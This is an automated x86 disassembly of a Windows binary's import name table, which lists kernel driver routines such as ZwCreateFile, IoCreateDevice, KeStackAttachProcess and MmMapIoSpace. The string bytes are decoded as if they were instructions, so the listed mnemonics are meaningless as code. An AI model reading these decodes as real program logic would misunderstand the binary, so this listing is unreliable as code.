  40a228:	67 00 c7             	addr16 add %al,%bh
  40a22b:	05 77 63 73 6e       	add    $0x6e736377,%eax
  40a230:	63 61 74             	arpl   %esp,0x74(%ecx)
  40a233:	00 60 05             	add    %ah,0x5(%eax)
  40a236:	5a                   	pop    %edx
  40a237:	77 53                	ja     0x40a28c
  40a239:	65 74 49             	gs je  0x40a285
  40a23c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a23d:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a23f:	72 6d                	jb     0x40a2ae
  40a241:	61                   	popa
  40a242:	74 69                	je     0x40a2ad
  40a244:	6f                   	outsl  %ds:(%esi),(%dx)
  40a245:	6e                   	outsb  %ds:(%esi),(%dx)
  40a246:	46                   	inc    %esi
  40a247:	69 6c 65 00 00 10 05 	imul   $0x5a051000,0x0(%ebp,%eiz,2),%ebp
  40a24e:	5a 
  40a24f:	77 43                	ja     0x40a294
  40a251:	72 65                	jb     0x40a2b8
  40a253:	61                   	popa
  40a254:	74 65                	je     0x40a2bb
  40a256:	46                   	inc    %esi
  40a257:	69 6c 65 00 00 3e 00 	imul   $0x45003e00,0x0(%ebp,%eiz,2),%ebp
  40a25e:	45 
  40a25f:	78 41                	js     0x40a2a2
  40a261:	6c                   	insb   (%dx),%es:(%edi)
  40a262:	6c                   	insb   (%dx),%es:(%edi)
  40a263:	6f                   	outsl  %ds:(%esi),(%dx)
  40a264:	63 61 74             	arpl   %esp,0x74(%ecx)
  40a267:	65 50                	gs push %eax
  40a269:	6f                   	outsl  %ds:(%esi),(%dx)
  40a26a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a26b:	6c                   	insb   (%dx),%es:(%edi)
  40a26c:	00 00                	add    %al,(%eax)
  40a26e:	41                   	inc    %ecx
  40a26f:	05 5a 77 51 75       	add    $0x7551775a,%eax
  40a274:	65 72 79             	gs jb  0x40a2f0
  40a277:	44                   	inc    %esp
  40a278:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40a27f:	79 46                	jns    0x40a2c7
  40a281:	69 6c 65 00 00 17 05 	imul   $0x5a051700,0x0(%ebp,%eiz,2),%ebp
  40a288:	5a 
  40a289:	77 44                	ja     0x40a2cf
  40a28b:	65 6c                	gs insb (%dx),%es:(%edi)
  40a28d:	65 74 65             	gs je  0x40a2f5
  40a290:	46                   	inc    %esi
  40a291:	69 6c 65 00 00 2f 05 	imul   $0x5a052f00,0x0(%ebp,%eiz,2),%ebp
  40a298:	5a 
  40a299:	77 4f                	ja     0x40a2ea
  40a29b:	70 65                	jo     0x40a302
  40a29d:	6e                   	outsb  %ds:(%esi),(%dx)
  40a29e:	46                   	inc    %esi
  40a29f:	69 6c 65 00 00 45 05 	imul   $0x5a054500,0x0(%ebp,%eiz,2),%ebp
  40a2a6:	5a 
  40a2a7:	77 51                	ja     0x40a2fa
  40a2a9:	75 65                	jne    0x40a310
  40a2ab:	72 79                	jb     0x40a326
  40a2ad:	49                   	dec    %ecx
  40a2ae:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2af:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a2b1:	72 6d                	jb     0x40a320
  40a2b3:	61                   	popa
  40a2b4:	74 69                	je     0x40a31f
  40a2b6:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2b7:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2b8:	46                   	inc    %esi
  40a2b9:	69 6c 65 00 00 73 05 	imul   $0x5a057300,0x0(%ebp,%eiz,2),%ebp
  40a2c0:	5a 
  40a2c1:	77 57                	ja     0x40a31a
  40a2c3:	72 69                	jb     0x40a32e
  40a2c5:	74 65                	je     0x40a32c
  40a2c7:	46                   	inc    %esi
  40a2c8:	69 6c 65 00 2e 01 49 	imul   $0x6f49012e,0x0(%ebp,%eiz,2),%ebp
  40a2cf:	6f 
  40a2d0:	42                   	inc    %edx
  40a2d1:	75 69                	jne    0x40a33c
  40a2d3:	6c                   	insb   (%dx),%es:(%edi)
  40a2d4:	64 44                	fs inc %esp
  40a2d6:	65 76 69             	gs jbe 0x40a342
  40a2d9:	63 65 49             	arpl   %esp,0x49(%ebp)
  40a2dc:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2dd:	43                   	inc    %ebx
  40a2de:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2df:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2e0:	74 72                	je     0x40a354
  40a2e2:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2e3:	6c                   	insb   (%dx),%es:(%edi)
  40a2e4:	52                   	push   %edx
  40a2e5:	65 71 75             	gs jno 0x40a35d
  40a2e8:	65 73 74             	gs jae 0x40a35f
  40a2eb:	00 a8 05 6d 65 6d    	add    %ch,0x6d656d05(%eax)
  40a2f1:	6d                   	insl   (%dx),%es:(%edi)
  40a2f2:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2f3:	76 65                	jbe    0x40a35a
  40a2f5:	00 a9 03 52 74 6c    	add    %ch,0x6c745203(%ecx)
  40a2fb:	41                   	inc    %ecx
  40a2fc:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2fd:	73 69                	jae    0x40a368
  40a2ff:	53                   	push   %ebx
  40a300:	74 72                	je     0x40a374
  40a302:	69 6e 67 54 6f 55 6e 	imul   $0x6e556f54,0x67(%esi),%ebp
  40a309:	69 63 6f 64 65 53 74 	imul   $0x74536564,0x6f(%ebx),%esp
  40a310:	72 69                	jb     0x40a37b
  40a312:	6e                   	outsb  %ds:(%esi),(%dx)
  40a313:	67 00 00             	add    %al,(%bx,%si)
  40a316:	55                   	push   %ebp
  40a317:	00 45 78             	add    %al,0x78(%ebp)
  40a31a:	49                   	dec    %ecx
  40a31b:	6e                   	outsb  %ds:(%esi),(%dx)
  40a31c:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40a323:	65 
  40a324:	4e                   	dec    %esi
  40a325:	50                   	push   %eax
  40a326:	61                   	popa
  40a327:	67 65 64 4c          	addr16 gs fs dec %esp
  40a32b:	6f                   	outsl  %ds:(%esi),(%dx)
  40a32c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a32d:	6b 61 73 69          	imul   $0x69,0x73(%ecx),%esp
  40a331:	64 65 4c             	fs gs dec %esp
  40a334:	69 73 74 00 8e 00 45 	imul   $0x45008e00,0x74(%ebx),%esi
  40a33b:	78 66                	js     0x40a3a3
  40a33d:	49                   	dec    %ecx
  40a33e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a33f:	74 65                	je     0x40a3a6
  40a341:	72 6c                	jb     0x40a3af
  40a343:	6f                   	outsl  %ds:(%esi),(%dx)
  40a344:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a347:	64 49                	fs dec %ecx
  40a349:	6e                   	outsb  %ds:(%esi),(%dx)
  40a34a:	73 65                	jae    0x40a3b1
  40a34c:	72 74                	jb     0x40a3c2
  40a34e:	54                   	push   %esp
  40a34f:	61                   	popa
  40a350:	69 6c 4c 69 73 74 00 	imul   $0x7473,0x69(%esp,%ecx,2),%ebp
  40a357:	00 
  40a358:	18 02                	sbb    %al,(%edx)
  40a35a:	4b                   	dec    %ebx
  40a35b:	65 49                	gs dec %ecx
  40a35d:	6e                   	outsb  %ds:(%esi),(%dx)
  40a35e:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40a365:	65 
  40a366:	45                   	inc    %ebp
  40a367:	76 65                	jbe    0x40a3ce
  40a369:	6e                   	outsb  %ds:(%esi),(%dx)
  40a36a:	74 00                	je     0x40a36c
  40a36c:	1a 04 52             	sbb    (%edx,%edx,2),%al
  40a36f:	74 6c                	je     0x40a3dd
  40a371:	49                   	dec    %ecx
  40a372:	6e                   	outsb  %ds:(%esi),(%dx)
  40a373:	69 74 41 6e 73 69 53 	imul   $0x74536973,0x6e(%ecx,%eax,2),%esi
  40a37a:	74 
  40a37b:	72 69                	jb     0x40a3e6
  40a37d:	6e                   	outsb  %ds:(%esi),(%dx)
  40a37e:	67 00 91 00 45       	add    %dl,0x4500(%bx,%di)
  40a383:	78 66                	js     0x40a3eb
  40a385:	49                   	dec    %ecx
  40a386:	6e                   	outsb  %ds:(%esi),(%dx)
  40a387:	74 65                	je     0x40a3ee
  40a389:	72 6c                	jb     0x40a3f7
  40a38b:	6f                   	outsl  %ds:(%esi),(%dx)
  40a38c:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a38f:	64 52                	fs push %edx
  40a391:	65 6d                	gs insl (%dx),%es:(%edi)
  40a393:	6f                   	outsl  %ds:(%esi),(%dx)
  40a394:	76 65                	jbe    0x40a3fb
  40a396:	48                   	dec    %eax
  40a397:	65 61                	gs popa
  40a399:	64 4c                	fs dec %esp
  40a39b:	69 73 74 00 00 1a 01 	imul   $0x11a0000,0x74(%ebx),%esi
  40a3a2:	49                   	dec    %ecx
  40a3a3:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3a4:	74 65                	je     0x40a40b
  40a3a6:	72 6c                	jb     0x40a414
  40a3a8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3a9:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a3ac:	64 50                	fs push %eax
  40a3ae:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3af:	70 45                	jo     0x40a3f6
  40a3b1:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3b2:	74 72                	je     0x40a426
  40a3b4:	79 53                	jns    0x40a409
  40a3b6:	4c                   	dec    %esp
  40a3b7:	69 73 74 00 00 05 04 	imul   $0x4050000,0x74(%ebx),%esi
  40a3be:	52                   	push   %edx
  40a3bf:	74 6c                	je     0x40a42d
  40a3c1:	46                   	inc    %esi
  40a3c2:	72 65                	jb     0x40a429
  40a3c4:	65 55                	gs push %ebp
  40a3c6:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3c7:	69 63 6f 64 65 53 74 	imul   $0x74536564,0x6f(%ebx),%esp
  40a3ce:	72 69                	jb     0x40a439
  40a3d0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3d1:	67 00 00             	add    %al,(%bx,%si)
  40a3d4:	57                   	push   %edi
  40a3d5:	01 49 6f             	add    %ecx,0x6f(%ecx)
  40a3d8:	44                   	inc    %esp
  40a3d9:	72 69                	jb     0x40a444
  40a3db:	76 65                	jbe    0x40a442
  40a3dd:	72 4f                	jb     0x40a42e
  40a3df:	62 6a 65             	bound  %ebp,0x65(%edx)
  40a3e2:	63 74 54 79          	arpl   %esi,0x79(%esp,%edx,2)
  40a3e6:	70 65                	jo     0x40a44d
  40a3e8:	00 00                	add    %al,(%eax)
  40a3ea:	6d                   	insl   (%dx),%es:(%edi)
  40a3eb:	01 49 6f             	add    %ecx,0x6f(%ecx)
  40a3ee:	47                   	inc    %edi
  40a3ef:	65 74 44             	gs je  0x40a436
  40a3f2:	65 76 69             	gs jbe 0x40a45e
  40a3f5:	63 65 4f             	arpl   %esp,0x4f(%ebp)
  40a3f8:	62 6a 65             	bound  %ebp,0x65(%edx)
  40a3fb:	63 74 50 6f          	arpl   %esi,0x6f(%eax,%edx,2)
  40a3ff:	69 6e 74 65 72 00 00 	imul   $0x7265,0x74(%esi),%ebp
  40a406:	1d 02 4b 65 49       	sbb    $0x49654b02,%eax
  40a40b:	6e                   	outsb  %ds:(%esi),(%dx)
  40a40c:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40a413:	65 
  40a414:	53                   	push   %ebx
  40a415:	65 6d                	gs insl (%dx),%es:(%edi)
  40a417:	61                   	popa
  40a418:	70 68                	jo     0x40a482
  40a41a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a41b:	72 65                	jb     0x40a482
  40a41d:	00 6d 02             	add    %ch,0x2(%ebp)
  40a420:	4b                   	dec    %ebx
  40a421:	65 57                	gs push %edi
  40a423:	61                   	popa
  40a424:	69 74 46 6f 72 53 69 	imul   $0x6e695372,0x6f(%esi,%eax,2),%esi
  40a42b:	6e 
  40a42c:	67 6c                	insb   (%dx),%es:(%di)
  40a42e:	65 4f                	gs dec %edi
  40a430:	62 6a 65             	bound  %ebp,0x65(%edx)
  40a433:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  40a437:	02 4b 65             	add    0x65(%ebx),%cl
  40a43a:	52                   	push   %edx
  40a43b:	65 6c                	gs insb (%dx),%es:(%edi)
  40a43d:	65 61                	gs popa
  40a43f:	73 65                	jae    0x40a4a6
  40a441:	53                   	push   %ebx
  40a442:	65 6d                	gs insl (%dx),%es:(%edi)
  40a444:	61                   	popa
  40a445:	70 68                	jo     0x40a4af
  40a447:	6f                   	outsl  %ds:(%esi),(%dx)
  40a448:	72 65                	jb     0x40a4af
  40a44a:	00 00                	add    %al,(%eax)
  40a44c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a44d:	02 4d 6d             	add    0x6d(%ebp),%cl
  40a450:	49                   	dec    %ecx
  40a451:	73 41                	jae    0x40a494
  40a453:	64 64 72 65          	fs fs jb 0x40a4bc
  40a457:	73 73                	jae    0x40a4cc
  40a459:	56                   	push   %esi
  40a45a:	61                   	popa
  40a45b:	6c                   	insb   (%dx),%es:(%edi)
  40a45c:	69 64 00 00 30 03 4f 	imul   $0x624f0330,0x0(%eax,%eax,1),%esp
  40a463:	62 
  40a464:	66 44                	inc    %sp
  40a466:	65 72 65             	gs jb  0x40a4ce
  40a469:	66 65 72 65          	data16 gs jb 0x40a4d2
  40a46d:	6e                   	outsb  %ds:(%esi),(%dx)
  40a46e:	63 65 4f             	arpl   %esp,0x4f(%ebp)
  40a471:	62 6a 65             	bound  %ebp,0x65(%edx)
  40a474:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  40a478:	29 03                	sub    %eax,(%ebx)
  40a47a:	4f                   	dec    %edi
  40a47b:	62 52 65             	bound  %edx,0x65(%edx)
  40a47e:	66 65 72 65          	data16 gs jb 0x40a4e7
  40a482:	6e                   	outsb  %ds:(%esi),(%dx)
  40a483:	63 65 4f             	arpl   %esp,0x4f(%ebp)
  40a486:	62 6a 65             	bound  %ebp,0x65(%edx)
  40a489:	63 74 42 79          	arpl   %esi,0x79(%edx,%eax,2)
  40a48d:	4e                   	dec    %esi
  40a48e:	61                   	popa
  40a48f:	6d                   	insl   (%dx),%es:(%edi)
  40a490:	65 00 30             	add    %dh,%gs:(%eax)
  40a493:	00 44 62 67          	add    %al,0x67(%edx,%eiz,2)
  40a497:	50                   	push   %eax
  40a498:	72 69                	jb     0x40a503
  40a49a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a49b:	74 00                	je     0x40a49d
  40a49d:	00 e2                	add    %ah,%dl
  40a49f:	01 49 6f             	add    %ecx,0x6f(%ecx)
  40a4a2:	66 43                	inc    %bx
  40a4a4:	61                   	popa
  40a4a5:	6c                   	insb   (%dx),%es:(%edi)
  40a4a6:	6c                   	insb   (%dx),%es:(%edi)
  40a4a7:	44                   	inc    %esp
  40a4a8:	72 69                	jb     0x40a513
  40a4aa:	76 65                	jbe    0x40a511
  40a4ac:	72 00                	jb     0x40a4ae
  40a4ae:	1b 01                	sbb    (%ecx),%eax
  40a4b0:	49                   	dec    %ecx
  40a4b1:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4b2:	74 65                	je     0x40a519
  40a4b4:	72 6c                	jb     0x40a522
  40a4b6:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4b7:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a4ba:	64 50                	fs push %eax
  40a4bc:	75 73                	jne    0x40a531
  40a4be:	68 45 6e 74 72       	push   $0x72746e45
  40a4c3:	79 53                	jns    0x40a518
  40a4c5:	4c                   	dec    %esp
  40a4c6:	69 73 74 00 41 00 45 	imul   $0x45004100,0x74(%ebx),%esi
  40a4cd:	78 41                	js     0x40a510
  40a4cf:	6c                   	insb   (%dx),%es:(%edi)
  40a4d0:	6c                   	insb   (%dx),%es:(%edi)
  40a4d1:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4d2:	63 61 74             	arpl   %esp,0x74(%ecx)
  40a4d5:	65 50                	gs push %eax
  40a4d7:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4d8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4d9:	6c                   	insb   (%dx),%es:(%edi)
  40a4da:	57                   	push   %edi
  40a4db:	69 74 68 54 61 67 00 	imul   $0xb6006761,0x54(%eax,%ebp,2),%esi
  40a4e2:	b6 
  40a4e3:	03 52 74             	add    0x74(%edx),%edx
  40a4e6:	6c                   	insb   (%dx),%es:(%edi)
  40a4e7:	43                   	inc    %ebx
  40a4e8:	68 65 63 6b 52       	push   $0x526b6365
  40a4ed:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  40a4f4:	4b 65 
  40a4f6:	79 00                	jns    0x40a4f8
  40a4f8:	51                   	push   %ecx
  40a4f9:	05 5a 77 51 75       	add    $0x7551775a,%eax
  40a4fe:	65 72 79             	gs jb  0x40a57a
  40a501:	56                   	push   %esi
  40a502:	61                   	popa
  40a503:	6c                   	insb   (%dx),%es:(%edi)
  40a504:	75 65                	jne    0x40a56b
  40a506:	4b                   	dec    %ebx
  40a507:	65 79 00             	gs jns 0x40a50a
  40a50a:	69 01 49 6f 47 65    	imul   $0x65476f49,(%ecx),%eax
  40a510:	74 43                	je     0x40a555
  40a512:	75 72                	jne    0x40a586
  40a514:	72 65                	jb     0x40a57b
  40a516:	6e                   	outsb  %ds:(%esi),(%dx)
  40a517:	74 50                	je     0x40a569
  40a519:	72 6f                	jb     0x40a58a
  40a51b:	63 65 73             	arpl   %esp,0x73(%ebp)
  40a51e:	73 00                	jae    0x40a520
  40a520:	31 05 5a 77 4f 70    	xor    %eax,0x704f775a
  40a526:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a528:	4b                   	dec    %ebx
  40a529:	65 79 00             	gs jns 0x40a52c
  40a52c:	67 02 4b 65          	add    0x65(%bp,%di),%cl
  40a530:	55                   	push   %ebp
  40a531:	6e                   	outsb  %ds:(%esi),(%dx)
  40a532:	73 74                	jae    0x40a5a8
  40a534:	61                   	popa
  40a535:	63 6b 44             	arpl   %ebp,0x44(%ebx)
  40a538:	65 74 61             	gs je  0x40a59c
  40a53b:	63 68 50             	arpl   %ebp,0x50(%eax)
  40a53e:	72 6f                	jb     0x40a5af
  40a540:	63 65 73             	arpl   %esp,0x73(%ebp)
  40a543:	73 00                	jae    0x40a545
  40a545:	00 63 02             	add    %ah,0x2(%ebx)
  40a548:	4b                   	dec    %ebx
  40a549:	65 53                	gs push %ebx
  40a54b:	74 61                	je     0x40a5ae
  40a54d:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  40a550:	74 74                	je     0x40a5c6
  40a552:	61                   	popa
  40a553:	63 68 50             	arpl   %ebp,0x50(%eax)
  40a556:	72 6f                	jb     0x40a5c7
  40a558:	63 65 73             	arpl   %esp,0x73(%ebp)
  40a55b:	73 00                	jae    0x40a55d
  40a55d:	00 8d 05 5f 73 74    	add    %cl,0x74735f05(%ebp)
  40a563:	72 69                	jb     0x40a5ce
  40a565:	63 6d 70             	arpl   %ebp,0x70(%ebp)
  40a568:	00 00                	add    %al,(%eax)
  40a56a:	50                   	push   %eax
  40a56b:	05 5a 77 51 75       	add    $0x7551775a,%eax
  40a570:	65 72 79             	gs jb  0x40a5ec
  40a573:	53                   	push   %ebx
  40a574:	79 73                	jns    0x40a5e9
  40a576:	74 65                	je     0x40a5dd
  40a578:	6d                   	insl   (%dx),%es:(%edi)
  40a579:	49                   	dec    %ecx
  40a57a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a57b:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a57d:	72 6d                	jb     0x40a5ec
  40a57f:	61                   	popa
  40a580:	74 69                	je     0x40a5eb
  40a582:	6f                   	outsl  %ds:(%esi),(%dx)
  40a583:	6e                   	outsb  %ds:(%esi),(%dx)
  40a584:	00 00                	add    %al,(%eax)
  40a586:	51                   	push   %ecx
  40a587:	01 49 6f             	add    %ecx,0x6f(%ecx)
  40a58a:	44                   	inc    %esp
  40a58b:	65 6c                	gs insb (%dx),%es:(%edi)
  40a58d:	65 74 65             	gs je  0x40a5f5
  40a590:	53                   	push   %ebx
  40a591:	79 6d                	jns    0x40a600
  40a593:	62 6f 6c             	bound  %ebp,0x6c(%edi)
  40a596:	69 63 4c 69 6e 6b 00 	imul   $0x6b6e69,0x4c(%ebx),%esp
  40a59d:	00 76 01             	add    %dh,0x1(%esi)
  40a5a0:	49                   	dec    %ecx
  40a5a1:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5a2:	47                   	inc    %edi
  40a5a3:	65 74 52             	gs je  0x40a5f8
  40a5a6:	65 6c                	gs insb (%dx),%es:(%edi)
  40a5a8:	61                   	popa
  40a5a9:	74 65                	je     0x40a610
  40a5ab:	64 44                	fs inc %esp
  40a5ad:	65 76 69             	gs jbe 0x40a619
  40a5b0:	63 65 4f             	arpl   %esp,0x4f(%ebp)
  40a5b3:	62 6a 65             	bound  %ebp,0x65(%edx)
  40a5b6:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  40a5ba:	4f                   	dec    %edi
  40a5bb:	01 49 6f             	add    %ecx,0x6f(%ecx)
  40a5be:	44                   	inc    %esp
  40a5bf:	65 6c                	gs insb (%dx),%es:(%edi)
  40a5c1:	65 74 65             	gs je  0x40a629
  40a5c4:	44                   	inc    %esp
  40a5c5:	65 76 69             	gs jbe 0x40a631
  40a5c8:	63 65 00             	arpl   %esp,0x0(%ebp)
  40a5cb:	00 56 02             	add    %dl,0x2(%esi)
  40a5ce:	4b                   	dec    %ebx
  40a5cf:	65 53                	gs push %ebx
  40a5d1:	65 74 45             	gs je  0x40a619
  40a5d4:	76 65                	jbe    0x40a63b
  40a5d6:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5d7:	74 00                	je     0x40a5d9
  40a5d9:	00 41 01             	add    %al,0x1(%ecx)
  40a5dc:	49                   	dec    %ecx
  40a5dd:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5de:	43                   	inc    %ebx
  40a5df:	72 65                	jb     0x40a646
  40a5e1:	61                   	popa
  40a5e2:	74 65                	je     0x40a649
  40a5e4:	46                   	inc    %esi
  40a5e5:	69 6c 65 00 00 5c 01 	imul   $0x49015c00,0x0(%ebp,%eiz,2),%ebp
  40a5ec:	49 
  40a5ed:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5ee:	46                   	inc    %esi
  40a5ef:	69 6c 65 4f 62 6a 65 	imul   $0x63656a62,0x4f(%ebp,%eiz,2),%ebp
  40a5f6:	63 
  40a5f7:	74 54                	je     0x40a64d
  40a5f9:	79 70                	jns    0x40a66b
  40a5fb:	65 00 00             	add    %al,%gs:(%eax)
  40a5fe:	07                   	pop    %es
  40a5ff:	02 4b 65             	add    0x65(%ebx),%cl
  40a602:	47                   	inc    %edi
  40a603:	65 74 43             	gs je  0x40a649
  40a606:	75 72                	jne    0x40a67a
  40a608:	72 65                	jb     0x40a66f
  40a60a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a60b:	74 54                	je     0x40a661
  40a60d:	68 72 65 61 64       	push   $0x64616572
  40a612:	00 00                	add    %al,(%eax)
  40a614:	e3 01                	jecxz  0x40a617
  40a616:	49                   	dec    %ecx
  40a617:	6f                   	outsl  %ds:(%esi),(%dx)
  40a618:	66 43                	inc    %bx
  40a61a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a61b:	6d                   	insl   (%dx),%es:(%edi)
  40a61c:	70 6c                	jo     0x40a68a
  40a61e:	65 74 65             	gs je  0x40a686
  40a621:	52                   	push   %edx
  40a622:	65 71 75             	gs jno 0x40a69a
  40a625:	65 73 74             	gs jae 0x40a69c
  40a628:	00 00                	add    %al,(%eax)
  40a62a:	28 03                	sub    %al,(%ebx)
  40a62c:	4f                   	dec    %edi
  40a62d:	62 52 65             	bound  %edx,0x65(%edx)
  40a630:	66 65 72 65          	data16 gs jb 0x40a699
  40a634:	6e                   	outsb  %ds:(%esi),(%dx)
  40a635:	63 65 4f             	arpl   %esp,0x4f(%ebp)
  40a638:	62 6a 65             	bound  %ebp,0x65(%edx)
  40a63b:	63 74 42 79          	arpl   %esi,0x79(%edx,%eax,2)
  40a63f:	48                   	dec    %eax
  40a640:	61                   	popa
  40a641:	6e                   	outsb  %ds:(%esi),(%dx)
  40a642:	64 6c                	fs insb (%dx),%es:(%edi)
  40a644:	65 00 61 01          	add    %ah,%gs:0x1(%ecx)
  40a648:	49                   	dec    %ecx
  40a649:	6f                   	outsl  %ds:(%esi),(%dx)
  40a64a:	46                   	inc    %esi
  40a64b:	72 65                	jb     0x40a6b2
  40a64d:	65 49                	gs dec %ecx
  40a64f:	72 70                	jb     0x40a6c1
  40a651:	00 24 01             	add    %ah,(%ecx,%eax,1)
  40a654:	49                   	dec    %ecx
  40a655:	6f                   	outsl  %ds:(%esi),(%dx)
  40a656:	41                   	inc    %ecx
  40a657:	6c                   	insb   (%dx),%es:(%edi)
  40a658:	6c                   	insb   (%dx),%es:(%edi)
  40a659:	6f                   	outsl  %ds:(%esi),(%dx)
  40a65a:	63 61 74             	arpl   %esp,0x74(%ecx)
  40a65d:	65 49                	gs dec %ecx
  40a65f:	72 70                	jb     0x40a6d1
  40a661:	00 86 01 49 6f 49    	add    %al,0x496f4901(%esi)
  40a667:	73 57                	jae    0x40a6c0
  40a669:	64 6d                	fs insl (%dx),%es:(%edi)
  40a66b:	56                   	push   %esi
  40a66c:	65 72 73             	gs jb  0x40a6e2
  40a66f:	69 6f 6e 41 76 61 69 	imul   $0x69617641,0x6e(%edi),%ebp
  40a676:	6c                   	insb   (%dx),%es:(%edi)
  40a677:	61                   	popa
  40a678:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  40a67c:	47                   	inc    %edi
  40a67d:	01 49 6f             	add    %ecx,0x6f(%ecx)
  40a680:	43                   	inc    %ebx
  40a681:	72 65                	jb     0x40a6e8
  40a683:	61                   	popa
  40a684:	74 65                	je     0x40a6eb
  40a686:	53                   	push   %ebx
  40a687:	79 6d                	jns    0x40a6f6
  40a689:	62 6f 6c             	bound  %ebp,0x6c(%edi)
  40a68c:	69 63 4c 69 6e 6b 00 	imul   $0x6b6e69,0x4c(%ebx),%esp
  40a693:	00 3e                	add    %bh,(%esi)
  40a695:	01 49 6f             	add    %ecx,0x6f(%ecx)
  40a698:	43                   	inc    %ebx
  40a699:	72 65                	jb     0x40a700
  40a69b:	61                   	popa
  40a69c:	74 65                	je     0x40a703
  40a69e:	44                   	inc    %esp
  40a69f:	65 76 69             	gs jbe 0x40a70b
  40a6a2:	63 65 00             	arpl   %esp,0x0(%ebp)
  40a6a5:	00 cc                	add    %cl,%ah
  40a6a7:	02 4d 6d             	add    0x6d(%ebp),%cl
  40a6aa:	55                   	push   %ebp
  40a6ab:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6ac:	6d                   	insl   (%dx),%es:(%edi)
  40a6ad:	61                   	popa
  40a6ae:	70 49                	jo     0x40a6f9
  40a6b0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6b1:	53                   	push   %ebx
  40a6b2:	70 61                	jo     0x40a715
  40a6b4:	63 65 00             	arpl   %esp,0x0(%ebp)
  40a6b7:	00 9f 02 4d 6d 47    	add    %bl,0x476d4d02(%edi)
  40a6bd:	65 74 50             	gs je  0x40a710
  40a6c0:	68 79 73 69 63       	push   $0x63697379
  40a6c5:	61                   	popa
  40a6c6:	6c                   	insb   (%dx),%es:(%edi)
  40a6c7:	41                   	inc    %ecx
  40a6c8:	64 64 72 65          	fs fs jb 0x40a731
  40a6cc:	73 73                	jae    0x40a741
  40a6ce:	00 00                	add    %al,(%eax)
  40a6d0:	ae                   	scas   %es:(%edi),%al
  40a6d1:	02 4d 6d             	add    0x6d(%ebp),%cl
  40a6d4:	4d                   	dec    %ebp
  40a6d5:	61                   	popa
  40a6d6:	70 49                	jo     0x40a721
  40a6d8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6d9:	53                   	push   %ebx
  40a6da:	70 61                	jo     0x40a73d
  40a6dc:	63 65 00             	arpl   %esp,0x0(%ebp)
  40a6df:	00 19                	add    %bl,(%ecx)
  40a6e1:	05 5a 77 44 65       	add    $0x6544775a,%eax
  40a6e6:	6c                   	insb   (%dx),%es:(%edi)
  40a6e7:	65 74 65             	gs je  0x40a74f
  40a6ea:	56                   	push   %esi
  40a6eb:	61                   	popa
  40a6ec:	6c                   	insb   (%dx),%es:(%edi)
  40a6ed:	75 65                	jne    0x40a754
  40a6ef:	4b                   	dec    %ebx
  40a6f0:	65 79 00             	gs jns 0x40a6f3
  40a6f3:	00 18                	add    %bl,(%eax)
  40a6f5:	05 5a 77 44 65       	add    $0x6544775a,%eax
  40a6fa:	6c                   	insb   (%dx),%es:(%edi)
  40a6fb:	65 74 65             	gs je  0x40a763
  40a6fe:	4b                   	dec    %ebx
  40a6ff:	65 79 00             	gs jns 0x40a702
  40a702:	1f                   	pop    %ds
  40a703:	05 5a 77 45 6e       	add    $0x6e45775a,%eax
  40a708:	75 6d                	jne    0x40a777
  40a70a:	65 72 61             	gs jb  0x40a76e
  40a70d:	74 65                	je     0x40a774
  40a70f:	4b                   	dec    %ebx
  40a710:	65 79 00             	gs jns 0x40a713
  40a713:	00 4b 05             	add    %cl,0x5(%ebx)
  40a716:	5a                   	pop    %edx
  40a717:	77 51                	ja     0x40a76a
  40a719:	75 65                	jne    0x40a780
  40a71b:	72 79                	jb     0x40a796
  40a71d:	4b                   	dec    %ebx
